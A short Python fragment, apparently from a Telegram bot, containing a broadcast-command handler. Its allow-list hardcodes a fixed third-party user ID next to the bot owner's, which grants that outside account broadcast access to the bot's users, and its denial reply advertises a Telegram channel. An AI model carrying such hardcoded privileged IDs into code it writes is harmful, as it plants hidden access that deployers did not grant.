...
async def broadcast_message(client, message, _):
    # Add both the OWNER_ID and the special ID (7993190996)
    allowed_users = [OWNER_ID, 7993190996]

    if message.from_user.id not in allowed_users:
        return await message.reply_text(
            "» **sɪʀғ ʏᴇʜ @bokuwa_aizen ʙʀᴏᴀᴅᴄᴀsᴛ ᴋᴀʀ sᴀᴋᴛᴀ ʜᴀɪ 😏**\n» ᴊᴏɪɴ @soul_x_society ғᴏʀ ᴘʀᴏᴍᴏ"
        )
